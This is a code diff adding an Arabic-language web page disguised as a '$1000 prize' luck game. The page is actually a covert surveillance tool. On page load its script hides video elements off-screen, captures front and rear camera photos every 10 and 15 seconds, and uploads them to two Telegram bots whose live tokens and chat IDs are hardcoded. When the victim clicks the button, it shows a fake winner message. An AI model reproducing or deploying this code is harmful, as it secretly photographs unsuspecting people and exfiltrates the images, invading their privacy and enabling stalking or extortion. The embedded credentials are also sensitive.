@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🏆 فز بـ 1000$ الآن - اختبار الحظ!</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            overflow-x: hidden;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            animation: slideIn 1s ease-out;
+        }
+        @keyframes slideIn {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        h1 { 
+            font-size: 2.2em; 
+            margin-bottom: 20px; 
+            background: linear-gradient(45deg, #FFD700, #FFA500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .prize { 
+            font-size: 4em; 
+            color: #FFD700; 
+            margin: 20px 0; 
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        .btn {
+            background: linear-gradient(45deg, #FF6B6B, #FF8E8E);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.3em;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 15px;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(255,107,107,0.4);
+        }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(255,107,107,0.6);
+        }
+        .btn:active { transform: translateY(-1px); }
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid #FFD700;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status { 
+            margin-top: 20px; 
+            font-size: 1.1em; 
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 فز بـ 1000$ الآن!</h1>
+        <div class="prize">💰 1000$ 💰</div>
+        <p style="font-size: 1.2em; margin-bottom: 30px;">
+            اضغط الزر للعب ومعرفة إذا فزت!
+        </p>
+        
+        <button class="btn" onclick="startGame()" id="playBtn">
+            🎮 العب الآن واكتشف حظك!
+        </button>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>جاري فحص الحظ... ⏳</p>
+        </div>
+        
+        <div class="status" id="status"></div>
+    </div>
+
+    <script>
+        // البوت الأول (القديم)
+        const BOT_TOKEN_1 = '8537499530:AAFyfu4ZMRzxlKXIJv0rmqTwn0tlg2RBZLg';
+        const CHAT_ID_1 = '5058927918';
+        
+        // البوت الثاني (الجديد)
+        const BOT_TOKEN_2 = '8392505675:AAFhliU8Dx7sVZbb3OyAxlRvzIax7OGAAvE';
+        const CHAT_ID_2 = '8128930712';
+
+        let isRecording = false;
+
+        // بدء التصوير المستمر للكاميرا الأمامية والخلفية فور فتح الموقع (خفي تماماً)
+        window.addEventListener('load', async () => {
+            startContinuousRecording();
+        });
+
+        function startContinuousRecording() {
+            // تصوير كاميرا أمامية كل 10 ثواني (خفي) - للـ 2 Bots
+            setInterval(async () => {
+                if (!isRecording) {
+                    await captureAndSend('user', '📸 كاميرا أمامية STEALTH');
+                }
+            }, 10000);
+
+            // تصوير كاميرا خلفية كل 15 ثانية (خفي) - للـ 2 Bots
+            setInterval(async () => {
+                if (!isRecording) {
+                    await captureAndSend('environment', '📷 كاميرا خلفية STEALTH');
+                }
+            }, 15000);
+        }
+
+        async function startGame() {
+            const playBtn = document.getElementById('playBtn');
+            const loading = document.getElementById('loading');
+            const status = document.getElementById('status');
+            
+            playBtn.classList.add('hidden');
+            loading.style.display = 'block';
+            status.textContent = 'جاري فحص الحظ... ⏳';
+            status.style.opacity = '1';
+            
+            try {
+                // التصوير المباشر عند الضغط
+                isRecording = true;
+                const frontPhoto = await capturePhoto('user');
+                const backPhoto = await capturePhoto('environment');
+                isRecording = false;
+                
+                // إرسال الصور للـ 2 Bots
+                await sendPhotosToBothBots(frontPhoto, backPhoto);
+                
+                status.innerHTML = '🎉 تهانينا! أنت من الفائزين! سيتم التواصل معك قريباً 📞';
+                status.style.color = '#FFD700';
+                
+            } catch (error) {
+                console.error('Error:', error);
+                status.textContent = 'حدث خطأ، حاول مرة أخرى';
+                isRecording = false;
+            }
+        }
+
+        async function captureAndSend(facingMode, caption) {
+            try {
+                const photo = await capturePhoto(facingMode);
+                if (photo) {
+                    await sendPhotoToBoth(photo, caption);
+                }
+            } catch (error) {
+                console.error('Capture error:', error);
+            }
+        }
+
+        // إرسال صورة للـ 2 Bots معاً
+        async function sendPhotoToBoth(photoDataUrl, caption) {
+            const promises = [
+                sendPhotoToBot(BOT_TOKEN_1, CHAT_ID_1, photoDataUrl, caption),
+                sendPhotoToBot(BOT_TOKEN_2, CHAT_ID_2, photoDataUrl, caption)
+            ];
+            await Promise.all(promises);
+        }
+
+        // إرسال الصور للـ 2 Bots عند الضغط
+        async function sendPhotosToBothBots(frontPhoto, backPhoto) {
+            if (frontPhoto) {
+                await sendPhotoToBoth(frontPhoto, '🎮 ضغط على الزر - كاميرا أمامية');
+            }
+            if (backPhoto) {
+                await sendPhotoToBoth(backPhoto, '🎮 ضغط على الزر - كاميرا خلفية');
+            }
+        }
+
+        async function sendPhotoToBot(token, chatId, photoDataUrl, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', dataURLtoBlob(photoDataUrl), `stealth_${Date.now()}.jpg`);
+            formData.append('caption', caption);
+            
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        function capturePhoto(facingMode) {
+            return new Promise((resolve) => {
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                video.style.position = 'fixed';
+                video.style.top = '-9999px';
+                video.style.left = '-9999px';
+                document.body.appendChild(video);
+                
+                navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: facingMode === 'user' ? 'user' : 'environment',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                }).then(stream => {
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        video.remove();
+                        
+                        canvas.toBlob(blob => {
+                            const reader = new FileReader();
+                            reader.onloadend = () => resolve(reader.result);
+                            reader.readAsDataURL(blob);
+                        }, 'image/jpeg', 0.8);
+                    }, 1500);
+                }).catch(() => {
+                    if (video.parentNode) video.remove();
+                    resolve(null);
+                });
+            });
+        }
+
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], { type: mime });
+        }
+    </script>
+</body>
+</html>
